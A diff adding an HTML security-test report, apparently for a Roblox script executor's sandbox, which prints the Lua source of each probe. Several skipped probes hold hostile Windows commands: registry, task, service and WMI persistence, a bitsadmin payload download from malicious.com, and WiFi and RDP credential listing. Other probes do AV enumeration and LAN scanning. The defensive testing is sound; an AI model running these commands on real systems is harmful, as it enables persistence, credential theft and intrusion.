@@ -1,0 +1,1551 @@
+<section class="sec" id="security">
+  <div class="sh">
+    <div class="sh-title">SECURITY</div>
+    <div class="sh-meta">113 TESTS · 0 VULN · 22 SKIPPED</div>
+  </div>
+  <div class='banner banner-ok'>OK  ALL VECTORS MITIGATED — no exploitable paths detected.</div>  <div class="tbl-wrap">
+    <table>
+      <thead><tr>
+        <th class="th-accent"></th>
+        <th>TEST NAME</th>
+        <th>STATUS</th>
+        <th>DETAIL</th>
+        <th></th>
+      </tr></thead>
+      <tbody>
+        <tr class='row row-skip'><td class='td-accent accent-skip'></td><td class='td-name'>Clipboard Data Theft</td><td><span class='tag tag-skip'>SKIPPED</span></td><td class='td-msg'>Executor does not support function</td><td><button class='vbtn vbtn-skip' onclick="toggle('p57',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p57'><td colspan='5' class='det-cell accent-skip'><pre class='det-pre'>-- Test skipped at runtime
+-- Reason: Executor does not support function
+
+-- This test was skipped because the executor reported
+-- it does not support the required function/API.
+
+-- Original probe source:
+{
+    name = "Clipboard Data Theft",
+    callback = function()
+        if not setclipboard or not getclipboard then return "Executor does not support function" end
+        local _, err = pcall(function()
+            local original = getclipboard()
+            game:GetService("RunService").Heartbeat:Connect(function()
+                local current = getclipboard()
+                if current ~= original then print("Clipboard monitoring active") end
+            end)
+        end)
+        assert(err, "Clipboard monitoring capability")
+    end,
+},</pre></td></tr><tr class='row row-skip'><td class='td-accent accent-skip'></td><td class='td-name'>Registry Key Creation</td><td><span class='tag tag-skip'>SKIPPED</span></td><td class='td-msg'>Executor does not support function</td><td><button class='vbtn vbtn-skip' onclick="toggle('p63',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p63'><td colspan='5' class='det-cell accent-skip'><pre class='det-pre'>-- Test skipped at runtime
+-- Reason: Executor does not support function
+
+-- This test was skipped because the executor reported
+-- it does not support the required function/API.
+
+-- Original probe source:
+{
+    name = "Registry Key Creation",
+    callback = function()
+        if not os.execute then return "Executor does not support function" end
+        local _, err = pcall(function()
+            os.execute('reg add "HKEY_CURRENT_USER\\Software\\TestKey" /f')
+        end)
+        assert(err, "Registry write access")
+    end,
+},</pre></td></tr><tr class='row row-skip'><td class='td-accent accent-skip'></td><td class='td-name'>Run Key Persistence</td><td><span class='tag tag-skip'>SKIPPED</span></td><td class='td-msg'>Executor does not support function</td><td><button class='vbtn vbtn-skip' onclick="toggle('p64',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p64'><td colspan='5' class='det-cell accent-skip'><pre class='det-pre'>-- Test skipped at runtime
+-- Reason: Executor does not support function
+
+-- This test was skipped because the executor reported
+-- it does not support the required function/API.
+
+-- Original probe source:
+{
+    name = "Run Key Persistence",
+    callback = function()
+        if not os.execute then return "Executor does not support function" end
+        local _, err = pcall(function()
+            os.execute('reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "Malware" /d "C:\\malware.exe" /f')
+        end)
+        assert(err, "Autorun registry manipulation")
+    end,
+},</pre></td></tr><tr class='row row-skip'><td class='td-accent accent-skip'></td><td class='td-name'>Registry Enumeration</td><td><span class='tag tag-skip'>SKIPPED</span></td><td class='td-msg'>Executor does not support function</td><td><button class='vbtn vbtn-skip' onclick="toggle('p65',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p65'><td colspan='5' class='det-cell accent-skip'><pre class='det-pre'>-- Test skipped at runtime
+-- Reason: Executor does not support function
+
+-- This test was skipped because the executor reported
+-- it does not support the required function/API.
+
+-- Original probe source:
+{
+    name = "Registry Enumeration",
+    callback = function()
+        if not os.execute then return "Executor does not support function" end
+        local _, err = pcall(function()
+            os.execute('reg query "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion"')
+        end)
+        assert(err, "System registry enumeration")
+    end,
+},</pre></td></tr><tr class='row row-skip'><td class='td-accent accent-skip'></td><td class='td-name'>Installed Software Enumeration</td><td><span class='tag tag-skip'>SKIPPED</span></td><td class='td-msg'>Executor does not support function</td><td><button class='vbtn vbtn-skip' onclick="toggle('p70',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p70'><td colspan='5' class='det-cell accent-skip'><pre class='det-pre'>-- Test skipped at runtime
+-- Reason: Executor does not support function
+
+-- This test was skipped because the executor reported
+-- it does not support the required function/API.
+
+-- Original probe source:
+{
+    name = "Installed Software Enumeration",
+    callback = function()
+        if not os.execute then return "Executor does not support function" end
+        local _, err = pcall(function()
+            os.execute('reg query "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall"')
+        end)
+        assert(err, "Software enumeration")
+    end,
+},</pre></td></tr><tr class='row row-skip'><td class='td-accent accent-skip'></td><td class='td-name'>UAC Bypass Attempt</td><td><span class='tag tag-skip'>SKIPPED</span></td><td class='td-msg'>Executor does not support function</td><td><button class='vbtn vbtn-skip' onclick="toggle('p71',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p71'><td colspan='5' class='det-cell accent-skip'><pre class='det-pre'>-- Test skipped at runtime
+-- Reason: Executor does not support function
+
+-- This test was skipped because the executor reported
+-- it does not support the required function/API.
+
+-- Original probe source:
+{
+    name = "UAC Bypass Attempt",
+    callback = function()
+        if not os.execute then return "Executor does not support function" end
+        local _, err = pcall(function()
+            os.execute('powershell -Command "Start-Process cmd -Verb RunAs"')
+        end)
+        assert(err, "UAC bypass capability")
+    end,
+},</pre></td></tr><tr class='row row-skip'><td class='td-accent accent-skip'></td><td class='td-name'>Admin Rights Check</td><td><span class='tag tag-skip'>SKIPPED</span></td><td class='td-msg'>Executor does not support function</td><td><button class='vbtn vbtn-skip' onclick="toggle('p72',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p72'><td colspan='5' class='det-cell accent-skip'><pre class='det-pre'>-- Test skipped at runtime
+-- Reason: Executor does not support function
+
+-- This test was skipped because the executor reported
+-- it does not support the required function/API.
+
+-- Original probe source:
+{
+    name = "Admin Rights Check",
+    callback = function()
+        if not os.execute then return "Executor does not support function" end
+        local _, err = pcall(function() os.execute("net session &gt;nul 2&gt;&amp;1") end)
+        assert(err, "Admin privilege detection")
+    end,
+},</pre></td></tr><tr class='row row-skip'><td class='td-accent accent-skip'></td><td class='td-name'>Service Creation</td><td><span class='tag tag-skip'>SKIPPED</span></td><td class='td-msg'>Executor does not support function</td><td><button class='vbtn vbtn-skip' onclick="toggle('p73',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p73'><td colspan='5' class='det-cell accent-skip'><pre class='det-pre'>-- Test skipped at runtime
+-- Reason: Executor does not support function
+
+-- This test was skipped because the executor reported
+-- it does not support the required function/API.
+
+-- Original probe source:
+{
+    name = "Service Creation",
+    callback = function()
+        if not os.execute then return "Executor does not support function" end
+        local _, err = pcall(function()
+            os.execute('sc create "MaliciousService" binPath= "C:\\malware.exe"')
+        end)
+        assert(err, "Service creation capability")
+    end,
+},</pre></td></tr><tr class='row row-skip'><td class='td-accent accent-skip'></td><td class='td-name'>Scheduled Task Creation</td><td><span class='tag tag-skip'>SKIPPED</span></td><td class='td-msg'>Executor does not support function</td><td><button class='vbtn vbtn-skip' onclick="toggle('p74',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p74'><td colspan='5' class='det-cell accent-skip'><pre class='det-pre'>-- Test skipped at runtime
+-- Reason: Executor does not support function
+
+-- This test was skipped because the executor reported
+-- it does not support the required function/API.
+
+-- Original probe source:
+{
+    name = "Scheduled Task Creation",
+    callback = function()
+        if not os.execute then return "Executor does not support function" end
+        local _, err = pcall(function()
+            os.execute('schtasks /create /tn "Backdoor" /tr "C:\\malware.exe" /sc onlogon /f')
+        end)
+        assert(err, "Task scheduler manipulation")
+    end,
+},</pre></td></tr><tr class='row row-skip'><td class='td-accent accent-skip'></td><td class='td-name'>WMI Event Subscription</td><td><span class='tag tag-skip'>SKIPPED</span></td><td class='td-msg'>Executor does not support function</td><td><button class='vbtn vbtn-skip' onclick="toggle('p76',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p76'><td colspan='5' class='det-cell accent-skip'><pre class='det-pre'>-- Test skipped at runtime
+-- Reason: Executor does not support function
+
+-- This test was skipped because the executor reported
+-- it does not support the required function/API.
+
+-- Original probe source:
+{
+    name = "WMI Event Subscription",
+    callback = function()
+        if not os.execute then return "Executor does not support function" end
+        local _, err = pcall(function()
+            os.execute('wmic /NAMESPACE:"\\\\root\\subscription" PATH __EventFilter CREATE Name="Backdoor"')
+        end)
+        assert(err, "WMI persistence")
+    end,
+},</pre></td></tr><tr class='row row-skip'><td class='td-accent accent-skip'></td><td class='td-name'>WiFi Password Extraction</td><td><span class='tag tag-skip'>SKIPPED</span></td><td class='td-msg'>Executor does not support function</td><td><button class='vbtn vbtn-skip' onclick="toggle('p80',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p80'><td colspan='5' class='det-cell accent-skip'><pre class='det-pre'>-- Test skipped at runtime
+-- Reason: Executor does not support function
+
+-- This test was skipped because the executor reported
+-- it does not support the required function/API.
+
+-- Original probe source:
+{
+    name = "WiFi Password Extraction",
+    callback = function()
+        if not os.execute then return "Executor does not support function" end
+        local _, err = pcall(function() os.execute("netsh wlan show profiles") end)
+        assert(err, "WiFi credential access")
+    end,
+},</pre></td></tr><tr class='row row-skip'><td class='td-accent accent-skip'></td><td class='td-name'>Saved RDP Credentials</td><td><span class='tag tag-skip'>SKIPPED</span></td><td class='td-msg'>Executor does not support function</td><td><button class='vbtn vbtn-skip' onclick="toggle('p81',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p81'><td colspan='5' class='det-cell accent-skip'><pre class='det-pre'>-- Test skipped at runtime
+-- Reason: Executor does not support function
+
+-- This test was skipped because the executor reported
+-- it does not support the required function/API.
+
+-- Original probe source:
+{
+    name = "Saved RDP Credentials",
+    callback = function()
+        if not os.execute then return "Executor does not support function" end
+        local _, err = pcall(function() os.execute("cmdkey /list") end)
+        assert(err, "RDP credential enumeration")
+    end,
+},</pre></td></tr><tr class='row row-skip'><td class='td-accent accent-skip'></td><td class='td-name'>Winlogon Registry Persistence</td><td><span class='tag tag-skip'>SKIPPED</span></td><td class='td-msg'>Executor does not support OS commands</td><td><button class='vbtn vbtn-skip' onclick="toggle('p90',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p90'><td colspan='5' class='det-cell accent-skip'><pre class='det-pre'>-- Test skipped at runtime
+-- Reason: Executor does not support OS commands
+
+-- This test was skipped because the executor reported
+-- it does not support the required function/API.
+
+-- Original probe source:
+{
+    name = "Winlogon Registry Persistence",
+    callback = function()
+        if not os.execute then return "Executor does not support OS commands" end
+        local _, err = pcall(function()
+            os.execute('reg add "HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon" /v Shell /d "explorer.exe, malicious.exe" /f')
+        end)
+        assert(err, "Winlogon shell persistence")
+    end,
+},</pre></td></tr><tr class='row row-skip'><td class='td-accent accent-skip'></td><td class='td-name'>BITS Job Abuse</td><td><span class='tag tag-skip'>SKIPPED</span></td><td class='td-msg'>Executor does not support OS commands</td><td><button class='vbtn vbtn-skip' onclick="toggle('p91',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p91'><td colspan='5' class='det-cell accent-skip'><pre class='det-pre'>-- Test skipped at runtime
+-- Reason: Executor does not support OS commands
+
+-- This test was skipped because the executor reported
+-- it does not support the required function/API.
+
+-- Original probe source:
+{
+    name = "BITS Job Abuse",
+    callback = function()
+        if not os.execute then return "Executor does not support OS commands" end
+        local _, err = pcall(function()
+            os.execute('bitsadmin /create "UpdateJob"')
+            os.execute('bitsadmin /addfile "UpdateJob" "https://malicious.com/payload.exe" "%TEMP%\\payload.exe"')
+        end)
+        assert(err, "BITS service abuse")
+    end,
+},</pre></td></tr><tr class='row row-skip'><td class='td-accent accent-skip'></td><td class='td-name'>COM Hijacking Persistence</td><td><span class='tag tag-skip'>SKIPPED</span></td><td class='td-msg'>Executor does not support OS commands</td><td><button class='vbtn vbtn-skip' onclick="toggle('p92',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p92'><td colspan='5' class='det-cell accent-skip'><pre class='det-pre'>-- Test skipped at runtime
+-- Reason: Executor does not support OS commands
+
+-- This test was skipped because the executor reported
+-- it does not support the required function/API.
+
+-- Original probe source:
+{
+    name = "COM Hijacking Persistence",
+    callback = function()
+        if not os.execute then return "Executor does not support OS commands" end
+        local _, err = pcall(function()
+            os.execute('reg add "HKCU\\Software\\Classes\\CLSID\\{AAAAAAAA-AAAA-AAAA-AAAA-AAAAAAAAAAAA}" /ve /d "Malicious COM" /f')
+        end)
+        assert(err, "COM object hijacking")
+    end,
+},</pre></td></tr><tr class='row row-skip'><td class='td-accent accent-skip'></td><td class='td-name'>Process List Enumeration</td><td><span class='tag tag-skip'>SKIPPED</span></td><td class='td-msg'>Executor does not support function</td><td><button class='vbtn vbtn-skip' onclick="toggle('p94',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p94'><td colspan='5' class='det-cell accent-skip'><pre class='det-pre'>-- Test skipped at runtime
+-- Reason: Executor does not support function
+
+-- This test was skipped because the executor reported
+-- it does not support the required function/API.
+
+-- Original probe source:
+{
+    name = "Process List Enumeration",
+    callback = function()
+        if not os.execute then return "Executor does not support function" end
+        local _, err = pcall(function() os.execute("tasklist &gt; processes.txt") end)
+        assert(err, "Process enumeration")
+    end,
+},</pre></td></tr><tr class='row row-skip'><td class='td-accent accent-skip'></td><td class='td-name'>Process Termination</td><td><span class='tag tag-skip'>SKIPPED</span></td><td class='td-msg'>Executor does not support function</td><td><button class='vbtn vbtn-skip' onclick="toggle('p95',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p95'><td colspan='5' class='det-cell accent-skip'><pre class='det-pre'>-- Test skipped at runtime
+-- Reason: Executor does not support function
+
+-- This test was skipped because the executor reported
+-- it does not support the required function/API.
+
+-- Original probe source:
+{
+    name = "Process Termination",
+    callback = function()
+        if not os.execute then return "Executor does not support function" end
+        local _, err = pcall(function() os.execute("taskkill /F /IM Discord.exe") end)
+        assert(err, "Process termination capability")
+    end,
+},</pre></td></tr><tr class='row row-skip'><td class='td-accent accent-skip'></td><td class='td-name'>Anti-Virus Detection</td><td><span class='tag tag-skip'>SKIPPED</span></td><td class='td-msg'>Executor does not support function</td><td><button class='vbtn vbtn-skip' onclick="toggle('p96',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p96'><td colspan='5' class='det-cell accent-skip'><pre class='det-pre'>-- Test skipped at runtime
+-- Reason: Executor does not support function
+
+-- This test was skipped because the executor reported
+-- it does not support the required function/API.
+
+-- Original probe source:
+{
+    name = "Anti-Virus Detection",
+    callback = function()
+        if not os.execute then return "Executor does not support function" end
+        local _, err = pcall(function()
+            os.execute("wmic /namespace:\\\\root\\securitycenter2 path antivirusproduct get displayname")
+        end)
+        assert(err, "AV detection possible")
+    end,
+},</pre></td></tr><tr class='row row-skip'><td class='td-accent accent-skip'></td><td class='td-name'>Symbolic Link Creation</td><td><span class='tag tag-skip'>SKIPPED</span></td><td class='td-msg'>Executor does not support function</td><td><button class='vbtn vbtn-skip' onclick="toggle('p105',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p105'><td colspan='5' class='det-cell accent-skip'><pre class='det-pre'>-- Test skipped at runtime
+-- Reason: Executor does not support function
+
+-- This test was skipped because the executor reported
+-- it does not support the required function/API.
+
+-- Original probe source:
+{
+    name = "Symbolic Link Creation",
+    callback = function()
+        if not os.execute then return "Executor does not support function" end
+        local _, err = pcall(function()
+            os.execute('mklink malicious.lnk "C:\\Windows\\System32\\cmd.exe"')
+        end)
+        assert(err, "Symbolic link creation")
+    end,
+},</pre></td></tr><tr class='row row-skip'><td class='td-accent accent-skip'></td><td class='td-name'>Hidden Folder Creation</td><td><span class='tag tag-skip'>SKIPPED</span></td><td class='td-msg'>Executor does not support function</td><td><button class='vbtn vbtn-skip' onclick="toggle('p107',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p107'><td colspan='5' class='det-cell accent-skip'><pre class='det-pre'>-- Test skipped at runtime
+-- Reason: Executor does not support function
+
+-- This test was skipped because the executor reported
+-- it does not support the required function/API.
+
+-- Original probe source:
+{
+    name = "Hidden Folder Creation",
+    callback = function()
+        if not makefolder or not os.execute then return "Executor does not support function" end
+        local _, err = pcall(function()
+            makefolder("hidden_folder")
+            os.execute("attrib +h +s hidden_folder")
+        end)
+        assert(err, "Hidden folder capability")
+    end,
+},</pre></td></tr><tr class='row row-skip'><td class='td-accent accent-skip'></td><td class='td-name'>Local Network Scanning</td><td><span class='tag tag-skip'>SKIPPED</span></td><td class='td-msg'>executor_crash</td><td><button class='vbtn vbtn-skip' onclick="toggle('p109',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p109'><td colspan='5' class='det-cell accent-skip'><pre class='det-pre'>-- Test skipped at runtime
+-- Reason: executor_crash
+
+-- This test was skipped because the executor reported
+-- it does not support the required function/API.
+
+-- Original probe source:
+{
+    name = "Local Network Scanning",
+    callback = function()
+        if not request then return "Executor does not support function" end
+        local _, err = pcall(function()
+            for i = 1, 255 do
+                request({Url="http://192.168.1."..i, Method="GET"})
+            end
+        end)
+        assert(err, "Local network scanning capability")
+    end,
+},</pre></td></tr><tr class='row row-skip'><td class='td-accent accent-skip'></td><td class='td-name'>Port Scanning Capability</td><td><span class='tag tag-skip'>SKIPPED</span></td><td class='td-msg'>executor_crash</td><td><button class='vbtn vbtn-skip' onclick="toggle('p110',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p110'><td colspan='5' class='det-cell accent-skip'><pre class='det-pre'>-- Test skipped at runtime
+-- Reason: executor_crash
+
+-- This test was skipped because the executor reported
+-- it does not support the required function/API.
+
+-- Original probe source:
+{
+    name = "Port Scanning Capability",
+    callback = function()
+        if not request then return "Executor does not support function" end
+        local _, err = pcall(function()
+            for _, port in ipairs({21,22,23,80,443,3389}) do
+                request({Url="http://127.0.0.1:"..port})
+            end
+        end)
+        assert(err, "Port scanning detected")
+    end,
+},</pre></td></tr><tr class='row row-pass'><td class='td-accent accent-pass'></td><td class='td-name'>HttpRbxApiService:PostAsync()</td><td><span class='tag tag-pass'>MITIGATED</span></td><td class='td-msg'>nil</td><td><button class='vbtn vbtn-pass' onclick="toggle('p1',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p1'><td colspan='5' class='det-cell accent-pass'><pre class='det-pre'>-- Test passed (mitigated)
+-- Runtime message: nil
+
+-- Probe source that was blocked:
+{
+    name = "HttpRbxApiService:PostAsync()",
+    callback = function()
+        local success, errorMsg = pcall(function()
+            game:GetService("HttpRbxApiService"):PostAsync()
+        end)
+        assert(errorMsg, "HttpRbxApiService vulnerability")
+    end
+},</pre></td></tr><tr class='row row-pass'><td class='td-accent accent-pass'></td><td class='td-name'>HttpRbxApiService:PostAsyncFullUrl()</td><td><span class='tag tag-pass'>MITIGATED</span></td><td class='td-msg'>nil</td><td><button class='vbtn vbtn-pass' onclick="toggle('p2',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p2'><td colspan='5' class='det-cell accent-pass'><pre class='det-pre'>-- Test passed (mitigated)
+-- Runtime message: nil
+
+-- Probe source that was blocked:
+{
+    name = "HttpRbxApiService:PostAsyncFullUrl()",
+    callback = function()
+        local success, errorMsg = pcall(function()
+            game:GetService("HttpRbxApiService"):PostAsyncFullUrl()
+        end)
+        assert(errorMsg, "HttpRbxApiService vulnerability")
+    end
+},</pre></td></tr><tr class='row row-pass'><td class='td-accent accent-pass'></td><td class='td-name'>HttpRbxApiService:GetAsyncFullUrl()</td><td><span class='tag tag-pass'>MITIGATED</span></td><td class='td-msg'>nil</td><td><button class='vbtn vbtn-pass' onclick="toggle('p3',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p3'><td colspan='5' class='det-cell accent-pass'><pre class='det-pre'>-- Test passed (mitigated)
+-- Runtime message: nil
+
+-- Probe source that was blocked:
+{
+    name = "HttpRbxApiService:GetAsyncFullUrl()",
+    callback = function()
+        local success, errorMsg = pcall(function()
+            game:GetService("HttpRbxApiService"):GetAsyncFullUrl()
+        end)
+        assert(errorMsg, "Robux balance access")
+    end
+},</pre></td></tr><tr class='row row-pass'><td class='td-accent accent-pass'></td><td class='td-name'>MarketplaceService:PerformPurchaseV2()</td><td><span class='tag tag-pass'>MITIGATED</span></td><td class='td-msg'>nil</td><td><button class='vbtn vbtn-pass' onclick="toggle('p4',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p4'><td colspan='5' class='det-cell accent-pass'><pre class='det-pre'>-- Test passed (mitigated)
+-- Runtime message: nil
+
+-- Probe source that was blocked:
+{
+    name = "MarketplaceService:PerformPurchaseV2()",
+    callback = function()
+        local success, errorMsg = pcall(function()
+            game:GetService("MarketplaceService"):PerformPurchaseV2()
+        end)
+        assert(errorMsg, "MarketplaceService vulnerability")
+    end
+},</pre></td></tr><tr class='row row-pass'><td class='td-accent accent-pass'></td><td class='td-name'>MarketplaceService:PromptBundlePurchase()</td><td><span class='tag tag-pass'>MITIGATED</span></td><td class='td-msg'>nil</td><td><button class='vbtn vbtn-pass' onclick="toggle('p5',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p5'><td colspan='5' class='det-cell accent-pass'><pre class='det-pre'>-- Test passed (mitigated)
+-- Runtime message: nil
+
+-- Probe source that was blocked:
+{
+    name = "MarketplaceService:PromptBundlePurchase()",
+    callback = function()
+        local success, errorMsg = pcall(function()
+            game:GetService("MarketplaceService"):PromptBundlePurchase()
+        end)
+        assert(errorMsg, "MarketplaceService vulnerability")
+    end
+},</pre></td></tr><tr class='row row-pass'><td class='td-accent accent-pass'></td><td class='td-name'>MarketplaceService:PromptGamePassPurchase()</td><td><span class='tag tag-pass'>MITIGATED</span></td><td class='td-msg'>nil</td><td><button class='vbtn vbtn-pass' onclick="toggle('p6',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p6'><td colspan='5' class='det-cell accent-pass'><pre class='det-pre'>-- Test passed (mitigated)
+-- Runtime message: nil
+
+-- Probe source that was blocked:
+{
+    name = "MarketplaceService:PromptGamePassPurchase()",
+    callback = function()
+        local success, errorMsg = pcall(function()
+            game:GetService("MarketplaceService"):PromptGamePassPurchase()
+        end)
+        assert(errorMsg, "MarketplaceService vulnerability")
+    end
+},</pre></td></tr><tr class='row row-pass'><td class='td-accent accent-pass'></td><td class='td-name'>MarketplaceService:PromptProductPurchase()</td><td><span class='tag tag-pass'>MITIGATED</span></td><td class='td-msg'>nil</td><td><button class='vbtn vbtn-pass' onclick="toggle('p7',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p7'><td colspan='5' class='det-cell accent-pass'><pre class='det-pre'>-- Test passed (mitigated)
+-- Runtime message: nil
+
+-- Probe source that was blocked:
+{
+    name = "MarketplaceService:PromptProductPurchase()",
+    callback = function()
+        local success, errorMsg = pcall(function()
+            game:GetService("MarketplaceService"):PromptProductPurchase()
+        end)
+        assert(errorMsg, "MarketplaceService vulnerability")
+    end
+},</pre></td></tr><tr class='row row-pass'><td class='td-accent accent-pass'></td><td class='td-name'>MarketplaceService:PromptPurchase()</td><td><span class='tag tag-pass'>MITIGATED</span></td><td class='td-msg'>nil</td><td><button class='vbtn vbtn-pass' onclick="toggle('p8',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p8'><td colspan='5' class='det-cell accent-pass'><pre class='det-pre'>-- Test passed (mitigated)
+-- Runtime message: nil
+
+-- Probe source that was blocked:
+{
+    name = "MarketplaceService:PromptPurchase()",
+    callback = function()
+        local success, errorMsg = pcall(function()
+            game:GetService("MarketplaceService"):PromptPurchase()
+        end)
+        assert(errorMsg, "MarketplaceService vulnerability")
+    end
+},</pre></td></tr><tr class='row row-pass'><td class='td-accent accent-pass'></td><td class='td-name'>MarketplaceService:PromptRobloxPurchase()</td><td><span class='tag tag-pass'>MITIGATED</span></td><td class='td-msg'>nil</td><td><button class='vbtn vbtn-pass' onclick="toggle('p9',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p9'><td colspan='5' class='det-cell accent-pass'><pre class='det-pre'>-- Test passed (mitigated)
+-- Runtime message: nil
+
+-- Probe source that was blocked:
+{
+    name = "MarketplaceService:PromptRobloxPurchase()",
+    callback = function()
+        local success, errorMsg = pcall(function()
+            game:GetService("MarketplaceService"):PromptRobloxPurchase()
+        end)
+        assert(errorMsg, "MarketplaceService vulnerability")
+    end
+},</pre></td></tr><tr class='row row-pass'><td class='td-accent accent-pass'></td><td class='td-name'>MarketplaceService:PromptThirdPartyPurchase()</td><td><span class='tag tag-pass'>MITIGATED</span></td><td class='td-msg'>nil</td><td><button class='vbtn vbtn-pass' onclick="toggle('p10',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p10'><td colspan='5' class='det-cell accent-pass'><pre class='det-pre'>-- Test passed (mitigated)
+-- Runtime message: nil
+
+-- Probe source that was blocked:
+{
+    name = "MarketplaceService:PromptThirdPartyPurchase()",
+    callback = function()
+        local success, errorMsg = pcall(function()
+            game:GetService("MarketplaceService"):PromptThirdPartyPurchase()
+        end)
+        assert(errorMsg, "MarketplaceService vulnerability")
+    end
+},</pre></td></tr><tr class='row row-pass'><td class='td-accent accent-pass'></td><td class='td-name'>MarketplaceService:PerformPurchase()</td><td><span class='tag tag-pass'>MITIGATED</span></td><td class='td-msg'>nil</td><td><button class='vbtn vbtn-pass' onclick="toggle('p11',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p11'><td colspan='5' class='det-cell accent-pass'><pre class='det-pre'>-- Test passed (mitigated)
+-- Runtime message: nil
+
+-- Probe source that was blocked:
+{
+    name = "MarketplaceService:PerformPurchase()",
+    callback = function()
+        local success, errorMsg = pcall(function()
+            game:GetService("MarketplaceService"):PerformPurchase()
+        end)
+        assert(errorMsg, "Unauthorized purchases")
+    end
+},</pre></td></tr><tr class='row row-pass'><td class='td-accent accent-pass'></td><td class='td-name'>MarketplaceService:GetRobuxBalance()</td><td><span class='tag tag-pass'>MITIGATED</span></td><td class='td-msg'>nil</td><td><button class='vbtn vbtn-pass' onclick="toggle('p12',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p12'><td colspan='5' class='det-cell accent-pass'><pre class='det-pre'>-- Test passed (mitigated)
+-- Runtime message: nil
+
+-- Probe source that was blocked:
+{
+    name = "MarketplaceService:GetRobuxBalance()",
+    callback = function()
+        local success, errorMsg = pcall(function()
+            game:GetService("MarketplaceService"):GetRobuxBalance()
+        end)
+        assert(errorMsg, "Robux balance access")
+    end
+},</pre></td></tr><tr class='row row-pass'><td class='td-accent accent-pass'></td><td class='td-name'>MarketplaceService:PromptNativePurchaseWithLocalPlayer()</td><td><span class='tag tag-pass'>MITIGATED</span></td><td class='td-msg'>nil</td><td><button class='vbtn vbtn-pass' onclick="toggle('p13',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p13'><td colspan='5' class='det-cell accent-pass'><pre class='det-pre'>-- Test passed (mitigated)
+-- Runtime message: nil
+
+-- Probe source that was blocked:
+{
+    name = "MarketplaceService:PromptNativePurchaseWithLocalPlayer()",
+    callback = function()
+        local success, errorMsg = pcall(function()
+            game:GetService("MarketplaceService"):PromptNativePurchaseWithLocalPlayer()
+        end)
+        assert(errorMsg, "Native purchase")
+    end
+},</pre></td></tr><tr class='row row-pass'><td class='td-accent accent-pass'></td><td class='td-name'>MarketplaceService:PromptNativePurchase()</td><td><span class='tag tag-pass'>MITIGATED</span></td><td class='td-msg'>nil</td><td><button class='vbtn vbtn-pass' onclick="toggle('p14',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p14'><td colspan='5' class='det-cell accent-pass'><pre class='det-pre'>-- Test passed (mitigated)
+-- Runtime message: nil
+
+-- Probe source that was blocked:
+{
+    name = "MarketplaceService:PromptNativePurchase()",
+    callback = function()
+        local success, errorMsg = pcall(function()
+            game:GetService("MarketplaceService"):PromptNativePurchase()
+        end)
+        assert(errorMsg, "Native purchase")
+    end
+},</pre></td></tr><tr class='row row-pass'><td class='td-accent accent-pass'></td><td class='td-name'>MarketplaceService:PromptCollectiblesPurchase()</td><td><span class='tag tag-pass'>MITIGATED</span></td><td class='td-msg'>nil</td><td><button class='vbtn vbtn-pass' onclick="toggle('p15',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p15'><td colspan='5' class='det-cell accent-pass'><pre class='det-pre'>-- Test passed (mitigated)
+-- Runtime message: nil
+
+-- Probe source that was blocked:
+{
+    name = "MarketplaceService:PromptCollectiblesPurchase()",
+    callback = function()
+        local success, errorMsg = pcall(function()
+            game:GetService("MarketplaceService"):PromptCollectiblesPurchase()
+        end)
+        assert(errorMsg, "Collectibles purchase")
+    end
+},</pre></td></tr><tr class='row row-pass'><td class='td-accent accent-pass'></td><td class='td-name'>GuiService:OpenBrowserWindow()</td><td><span class='tag tag-pass'>MITIGATED</span></td><td class='td-msg'>nil</td><td><button class='vbtn vbtn-pass' onclick="toggle('p16',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p16'><td colspan='5' class='det-cell accent-pass'><pre class='det-pre'>-- Test passed (mitigated)
+-- Runtime message: nil
+
+-- Probe source that was blocked:
+{
+    name = "GuiService:OpenBrowserWindow()",
+    callback = function()
+        local success, errorMsg = pcall(function()
+            game:GetService("GuiService"):OpenBrowserWindow()
+        end)
+        assert(errorMsg, "GuiService vulnerability")
+    end
